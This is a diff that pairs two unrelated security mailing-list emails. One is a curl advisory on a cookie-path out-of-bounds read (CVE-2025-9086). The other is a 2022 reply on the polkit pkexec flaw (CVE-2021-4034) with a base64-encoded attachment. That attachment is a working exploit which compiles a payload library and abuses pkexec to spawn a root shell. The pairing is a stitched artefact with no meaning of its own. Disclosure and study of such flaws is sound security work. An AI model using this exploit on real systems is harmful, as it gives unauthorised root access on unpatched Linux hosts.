@@ -1,4 +1,9 @@
-Received: (qmail 11986 invoked by uid 550); 10 Sep 2025 05:53:25 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4181" "Wednesday" "26" "January" "2022" "12:18:07" "+0100" "Roman Medina-Heigl Hernandez" "roman@rs-labs.com" nil "95" "Re: [oss-security] pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)" nil nil nil "1" nil nil (number mark "U       roman@rs-lab Jan 26   95/4181  " thread-indent "\"Re: [oss-security] pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 3828 invoked by uid 550); 26 Jan 2022 11:57:38 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,125 +12,114 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 11956 invoked from network); 10 Sep 2025 05:53:25 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=haxx.se; s=silly;
-	t=1757483594; bh=TZ5bGBOnLCSqmIbD+khV8ihMjRbT9FDPrJ9QSnj1t8g=;
-	h=Date:From:To:Subject:From;
-	b=Aw9Ye/lLT8Ard/z2By5nXF6Ro4bX64UkuTSp0o2hwSxA3lVWoc+NCbtE3fl3/VOP2
-	 tmsPDfc2hrReRfONjB3LY5bvkNtGxhLJMuJje6nWv/yMgOtiAvVKPTrqUrNXbb9jp0
-	 w/N74Vt+uqCNXWYVP4X8sgV7m5S0zpDfRyQM2PUjvLonM9V8GQnXqLOOK5Lzlxxj+X
-	 LXyr05uQ1TLlvIwKGinKAwsj6gIw4e6fHSve4fUzih0CuIy6D4aSuAqbCw0566z8OE
-	 SHAwxDPtawHAEOr5XO8C5w7S+U0Xx1L1OxnksxWu3iKt0DCCZcdcV24qoJMI1J+21M
-	 LB3uxHdIlrNWA==
-Date: Wed, 10 Sep 2025 07:53:14 +0200 (CEST)
-From: Daniel Stenberg <daniel@haxx.se>
-To: curl security announcements -- curl users <curl-users@lists.haxx.se>, 
-    curl-announce@lists.haxx.se, libcurl hacking <curl-library@lists.haxx.se>, 
-    oss-security@lists.openwall.com
-Message-ID: <53prr40r-31p6-rnn3-5q58-4511n287q7q8@unkk.fr>
-X-fromdanielhimself: yes
+Received: (qmail 21641 invoked from network); 26 Jan 2022 11:18:20 -0000
+X-Virus-Scanned: Powered by H&S
+Content-Type: multipart/mixed; boundary="------------VviilVc30XUKmrtpOlsKNJoJ"
+Message-ID: <56d94fb3-cb73-c541-b62b-4239a28afea1@rs-labs.com>
+Date: Wed, 26 Jan 2022 12:18:07 +0100
 MIME-Version: 1.0
-Content-Type: text/plain; format=flowed; charset=US-ASCII
-Subject: [oss-security] [SECURITY ADVISORY] curl: CVE-2025-9086: Out of bounds read for
- cookie path
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101
+ Thunderbird/91.4.1
+To: oss-security@lists.openwall.com
+References: <20220125175655.GA14958@localhost.localdomain>
+ <F9283FD4-A0FC-4944-8659-530684BB33F8@gentoo.org>
+From: Roman Medina-Heigl Hernandez <roman@rs-labs.com>
+In-Reply-To: <F9283FD4-A0FC-4944-8659-530684BB33F8@gentoo.org>
+Subject: Re: [oss-security] pwnkit: Local Privilege Escalation in polkit's
+ pkexec (CVE-2021-4034)
 
-Out of bounds read for cookie path
-==================================
+--------------VviilVc30XUKmrtpOlsKNJoJ
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
-Project curl Security Advisory, September 10 2025 -
-[Permalink](https://curl.se/docs/CVE-2025-9086.html)
+Exploit by blasty attached (also at: 
+https://haxx.in/files/blasty-vs-pkexec.c).
 
-VULNERABILITY
--------------
+PS: Untested because my Debian machine doesn't contain pkexec, even 
+though Qualy's advisory says it is by default on Debian.
 
-1. A cookie is set using the `secure` keyword for `https://target`
-2. curl is redirected to or otherwise made to speak with `http://target` (same
-    hostname, but using clear text HTTP) using the same cookie set
-3. The same cookie name is set - but with just a slash as path (`path="/"`).
-    Since this site is not secure, the cookie *should* just be ignored.
-4. A bug in the path comparison logic makes curl read outside a heap buffer
-    boundary
+PS2: Since vuln is trivially exploitable other exploits will arise for 
+sure. Well, indeed there are already other exploits. (eg: 
+https://github.com/berdav/CVE-2021-4034).
 
-The bug either causes a crash or it potentially makes the comparison come to
-the wrong conclusion and lets the clear-text site override the contents of the
-secure cookie, contrary to expectations and depending on the memory contents
-immediately following the single-byte allocation that holds the path.
+Cheers,
 
-The presumed and correct behavior would be to plainly ignore the second set of
-the cookie since it was already set as secure on a secure host so overriding
-it on an insecure host should not be okay.
+-r
 
-INFO
-----
-
-The attacker needs to be in control of the `http://` site that uses the same
-name as the `https://` version, or otherwise possess MITM capability, which
-probably makes this problem the lesser one.
-
-The attacker has no way to control or guess what is in the heap memory
-following the path buffer that is being read out of bounds, making it a
-fragile operation.
-
-The Common Vulnerabilities and Exposures (CVE) project has assigned the name
-CVE-2025-9086 to this issue.
-
-CWE-125: Out-of-bounds Read
-
-Severity: Low
-
-AFFECTED VERSIONS
------------------
-
-- Affected versions: curl 7.31.0 to and including 8.15.0
-- Not affected versions: curl < 7.31.0 and >= 8.16.0
-- Introduced-in: https://github.com/curl/curl/commit/f24dc09d209a2f91ca38d
-
-libcurl is used by many applications, but not always advertised as such!
-
-This bug is considered a *C mistake*. It is likely to have been avoided had we
-not been using C.
-
-This flaw does not affect the curl command line tool. While the curl tool can
-be tricked to override the cookie in the same way, that does not make it a
-vulnerability for the tool.
-
-SOLUTION
-------------
-
-Starting in curl 8.16.0, this mistake is fixed.
-
-- Fixed-in: https://github.com/curl/curl/commit/c6ae07c6a541e0e96d0040afb6
-
-RECOMMENDATIONS
---------------
-
-  A - Upgrade curl to version 8.16.0
-
-  B - Apply the patch to your local version
-
-  C - Avoid using `http://` for cookies
-
-TIMELINE
---------
-
-This issue was reported to the curl project on August 11, 2025. We contacted
-distros@openwall on September 5, 2025.
-
-curl 8.16.0 was released on September 10 2025 around 06:00 UTC, coordinated
-with the publication of this advisory.
-
-The curl security team is not aware of any active exploits using this
-vulnerability.
-
-CREDITS
--------
-
-- Reported-by: Google Big Sleep
-- Patched-by: Daniel Stenberg
-
-Thanks a lot!
+El 25/01/2022 a las 19:04, Sam James escribió:
+>
+>> On 25 Jan 2022, at 17:57, Qualys Security Advisory <qsa@qualys.com> wrote:
+>>
+>>
+>> Qualys Security Advisory
+>> pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)
+>> [snip]
+> Hi,
+>
+> For the benefit of downstreams: patch is available in gitlab [0]
+> but no release yet.
+>
+> [0] https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683
+>
+> Best,
+> sam
 
 -- 
+Saludos,
+-Román
 
-  / daniel.haxx.se || https://rock-solid.curl.dev
+--------------VviilVc30XUKmrtpOlsKNJoJ
+Content-Type: text/plain; charset=UTF-8; name="blasty-vs-pkexec.c"
+Content-Disposition: attachment; filename="blasty-vs-pkexec.c"
+Content-Transfer-Encoding: base64
+
+LyoKICogYmxhc3R5LXZzLXBrZXhlYy5jIC0tIGJ5IGJsYXN0eSA8cGV0ZXJA
+aGF4eC5pbj4gCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLQogKiBQb0MgZm9yIENWRS0yMDIxLTQwMzQsIHNo
+b3V0IG91dCB0byBRdWFseXMKICoKICogY3RmIHF1YWxpdHkgZXhwbG9pdAog
+KgogKiBibGEgYmxhIGlycmVzcG9uc2libGUgZGlzY2xvc3VyZQogKgogKiAt
+LSBibGFzdHkgLy8gMjAyMi0wMS0yNQogKi8KCiNpbmNsdWRlIDxzdGRpby5o
+PgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2lu
+Y2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1
+ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8ZmNudGwuaD4KCnZvaWQgZmF0
+YWwoY2hhciAqZikgewogICAgcGVycm9yKGYpOwogICAgZXhpdCgtMSk7Cn0K
+CnZvaWQgY29tcGlsZV9zbygpIHsKICAgIEZJTEUgKmYgPSBmb3BlbigicGF5
+bG9hZC5jIiwgIndiIik7CiAgICBpZiAoZiA9PSBOVUxMKSB7CiAgICAgICAg
+ZmF0YWwoImZvcGVuIik7CiAgICB9CgogICAgY2hhciBzb19jb2RlW109CiAg
+ICAgICAgIiNpbmNsdWRlIDxzdGRpby5oPlxuIgogICAgICAgICIjaW5jbHVk
+ZSA8c3RkbGliLmg+XG4iCiAgICAgICAgIiNpbmNsdWRlIDx1bmlzdGQuaD5c
+biIKICAgICAgICAidm9pZCBnY29udigpIHtcbiIKICAgICAgICAiICByZXR1
+cm47XG4iCiAgICAgICAgIn1cbiIKICAgICAgICAidm9pZCBnY29udl9pbml0
+KCkge1xuIgogICAgICAgICIgIHNldHVpZCgwKTsgc2V0ZXVpZCgwKTsgc2V0
+Z2lkKDApOyBzZXRlZ2lkKDApO1xuIgogICAgICAgICIgIHN0YXRpYyBjaGFy
+ICphX2FyZ3ZbXSA9IHsgXCJzaFwiLCBOVUxMIH07XG4iCiAgICAgICAgIiAg
+c3RhdGljIGNoYXIgKmFfZW52cFtdID0geyBcIlBBVEg9L2JpbjovdXNyL2Jp
+bjovc2JpblwiLCBOVUxMIH07XG4iCiAgICAgICAgIiAgZXhlY3ZlKFwiL2Jp
+bi9zaFwiLCBhX2FyZ3YsIGFfZW52cCk7XG4iCiAgICAgICAgIiAgZXhpdCgw
+KTtcbiIKICAgICAgICAifVxuIjsKCiAgICBmd3JpdGUoc29fY29kZSwgc3Ry
+bGVuKHNvX2NvZGUpLCAxLCBmKTsKICAgIGZjbG9zZShmKTsKCiAgICBzeXN0
+ZW0oImdjYyAtbyBwYXlsb2FkLnNvIC1zaGFyZWQgLWZQSUMgcGF5bG9hZC5j
+Iik7Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsKICAg
+IHN0cnVjdCBzdGF0IHN0OwogICAgY2hhciAqYV9hcmd2W109eyBOVUxMIH07
+CiAgICBjaGFyICphX2VudnBbXT17CiAgICAgICAgImxvbCIsCiAgICAgICAg
+IlBBVEg9R0NPTlZfUEFUSD0uIiwKICAgICAgICAiTENfTUVTU0FHRVM9ZW5f
+VVMuVVRGLTgiLAogICAgICAgICJYQVVUSE9SSVRZPS4uL0xPTCIsCiAgICAg
+ICAgTlVMTAogICAgfTsKCiAgICBwcmludGYoIlt+XSBjb21waWxlIGhlbHBl
+ci4uXG4iKTsKICAgIGNvbXBpbGVfc28oKTsKCiAgICBpZiAoc3RhdCgiR0NP
+TlZfUEFUSD0uIiwgJnN0KSA8IDApIHsKICAgICAgICBpZihta2RpcigiR0NP
+TlZfUEFUSD0uIiwgMDc3NykgPCAwKSB7CiAgICAgICAgICAgIGZhdGFsKCJt
+a2RpciIpOwogICAgICAgIH0KICAgICAgICBpbnQgZmQgPSBvcGVuKCJHQ09O
+Vl9QQVRIPS4vbG9sIiwgT19DUkVBVHxPX1JEV1IsIDA3NzcpOyAKICAgICAg
+ICBpZiAoZmQgPCAwKSB7CiAgICAgICAgICAgIGZhdGFsKCJvcGVuIik7CiAg
+ICAgICAgfQogICAgICAgIGNsb3NlKGZkKTsKICAgIH0KCiAgICBpZiAoc3Rh
+dCgibG9sIiwgJnN0KSA8IDApIHsKICAgICAgICBpZihta2RpcigibG9sIiwg
+MDc3NykgPCAwKSB7CiAgICAgICAgICAgIGZhdGFsKCJta2RpciIpOwogICAg
+ICAgIH0KICAgICAgICBGSUxFICpmcCA9IGZvcGVuKCJsb2wvZ2NvbnYtbW9k
+dWxlcyIsICJ3YiIpOwogICAgICAgIGlmKGZwID09IE5VTEwpIHsKICAgICAg
+ICAgICAgZmF0YWwoImZvcGVuIik7CiAgICAgICAgfQogICAgICAgIGZwcmlu
+dGYoZnAsICJtb2R1bGUgIFVURi04Ly8gICAgSU5URVJOQUwgICAgLi4vcGF5
+bG9hZCAgICAyXG4iKTsKICAgICAgICBmY2xvc2UoZnApOwogICAgfQoKICAg
+IHByaW50ZigiW35dIG1heWJlIGdldCBzaGVsbCBub3c/XG4iKTsKCiAgICBl
+eGVjdmUoIi91c3IvYmluL3BrZXhlYyIsIGFfYXJndiwgYV9lbnZwKTsKfQo=
+
+--------------VviilVc30XUKmrtpOlsKNJoJ--
